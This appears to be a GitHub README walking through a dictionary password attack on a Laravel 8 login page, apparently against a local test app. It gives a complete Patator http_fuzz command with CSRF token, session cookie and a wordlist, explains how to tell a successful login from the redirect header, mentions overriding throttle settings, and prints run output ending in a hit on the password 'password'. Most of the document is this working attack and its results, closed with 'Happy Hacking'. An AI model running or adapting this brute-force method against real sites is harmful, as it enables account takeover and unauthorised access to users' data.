# Laravel-8-Dictionary-attack
Laravel username and password attacks
<pre>
    When the form is submitted response from the server is always 302 Found for all the inputs.
    Following you will get a GET request with 200 status code
    For correct/incorrect the credentials may be the status code is 302 and 200.
    Content-length is same
    
 How to get rid of this    
    Size of the response varies in 1-byte for both sucess and failed attempts
    so only option is the redirection header
    Get request redirects to Location : http://127.0.0.1:8000/login 
    Consider this will change after a successful login

Even to figure out these stuff laravel app locked out IP for many attempts
override default throttle settings for our purpose

Based on these consideration our attack follows:
Laravel App version : 8.x

package ui:Auth which takes care the authentication
our required parameters for the attack
    1 => _token 
    2 => email 
    3 => password
    4 => session_cookie
    5 => XSRF-TOKEN

Python Patator command 

time patator http_fuzz method=POST url="http://127.0.0.1:8000/login" 0=/usr/share/wordlists/nmap.lst              body="email=pascale.robel@example.org&password=FILE0&_token=kt33P50poYKRddZDDnnL174O5K43KPTJDhIaJ7S6" follow=1 header=@header.txt -x quit:fgrep!="Location: http://127.0.0.1:8000/login" accept_cookie=0

method => post
_token => @csrf token either inscpect or curl it(it will vary for every request)
          Challenge is that, if we allow the get request following the form submit, it will get vary
header => session_cookie and XSRF-TOKEN in the file

follow=1 =>  we have to follow the redirection

          we know well that if the login succeeds it will redirect to other location,
          GET request will be same redirect header for failed attempts
          
x quit:fgrep!="Location: http://127.0.0.1:8000/login"

          if the GET response has different header to redirect then it is a valid login.
          
Result of the attack
01:01:49 patator    INFO - code size:clen       time | candidate                          |   num | mesg
01:01:49 patator    INFO - -----------------------------------------------------------------------------
01:01:56 patator    INFO - 200  9004:-1        6.419 | 12345                              |     2 | HTTP/1.1 200 OK
01:01:57 patator    INFO - 200  8709:-1        7.056 | 123456                             |     1 | HTTP/1.1 200 OK
01:01:57 patator    INFO - 200  8709:-1        7.218 | 123456789                          |     3 | HTTP/1.1 200 OK
01:01:57 patator    INFO - 200  8709:-1        7.644 | iloveyou                           |     4 | HTTP/1.1 200 OK
01:01:57 patator    INFO - 200  8709:-1        7.871 | 12345678                           |     6 | HTTP/1.1 200 OK
01:01:58 patator    INFO - 200  8709:-1        8.293 | princess                           |     5 | HTTP/1.1 200 OK
01:01:58 patator    INFO - 200  8709:-1        8.722 | 1234567                            |     7 | HTTP/1.1 200 OK
01:01:59 patator    INFO - 200  8709:-1        9.047 | nicole                             |     9 | HTTP/1.1 200 OK
01:01:59 patator    INFO - 200  8709:-1        9.299 | daniel                             |    10 | HTTP/1.1 200 OK
01:01:59 patator    INFO - 200  8709:-1        9.628 | abc123                             |     8 | HTTP/1.1 200 OK
01:02:06 patator    INFO - 200  9004:-1        9.438 | babygirl                           |    12 | HTTP/1.1 200 OK
01:02:06 patator    INFO - 200  8709:-1        9.312 | monkey                             |    11 | HTTP/1.1 200 OK
01:02:06 patator    INFO - 200  8709:-1        9.642 | qwerty                             |    13 | HTTP/1.1 200 OK
01:02:07 patator    INFO - 200  8709:-1        9.517 | lovely                             |    14 | HTTP/1.1 200 OK
01:02:07 patator    INFO - 200  8709:-1        9.619 | michael                            |    16 | HTTP/1.1 200 OK
01:02:08 patator    INFO - 200  8709:-1        9.435 | 654321                             |    15 | HTTP/1.1 200 OK
01:02:08 patator    INFO - 200  8709:-1        9.590 | jessica                            |    17 | HTTP/1.1 200 OK
01:02:08 patator    INFO - 200  8709:-1        9.522 | ashley                             |    19 | HTTP/1.1 200 OK
01:02:09 patator    INFO - 200  8709:-1        9.732 | 000000                             |    20 | HTTP/1.1 200 OK
01:02:09 patator    INFO - 200  8709:-1        9.624 | 111111                             |    18 | HTTP/1.1 200 OK
01:02:14 patator    INFO - 200  8709:-1        8.035 | iloveu                             |    21 | HTTP/1.1 200 OK
01:02:14 patator    INFO - 200  9004:-1        8.290 | michelle                           |    22 | HTTP/1.1 200 OK
01:02:15 patator    INFO - 200  8709:-1        7.884 | tigger                             |    23 | HTTP/1.1 200 OK
01:02:15 patator    INFO - 200  8709:-1        7.588 | sunshine                           |    24 | HTTP/1.1 200 OK
01:02:15 patator    INFO - 200  8709:-1        7.769 | password1                          |    26 | HTTP/1.1 200 OK
01:02:15 patator    INFO - 200  8709:-1        7.469 | chocolate                          |    25 | HTTP/1.1 200 OK
01:02:15 patator    INFO - 200  8709:-1        7.369 | soccer                             |    27 | HTTP/1.1 200 OK
01:02:16 patator    INFO - 200  8709:-1        7.360 | friends                            |    29 | HTTP/1.1 200 OK
01:02:16 patator    INFO - 200  8709:-1        7.624 | purple                             |    30 | HTTP/1.1 200 OK
01:02:16 patator    INFO - 200  8709:-1        7.234 | anthony                            |    28 | HTTP/1.1 200 OK
01:02:17 patator    INFO - 500  187:-1         2.869 | password                           |    32 | HTTP/1.0 500 Internal Server Error

As you can see once it finds the valid password it server throws an error saying Internal Server Error
Because @csrf _token mismatch happens here for every GET request.

Be watchful for the account lockout in laravel, I tried like script kiddie guys...
Happy Hacking !!!...
          
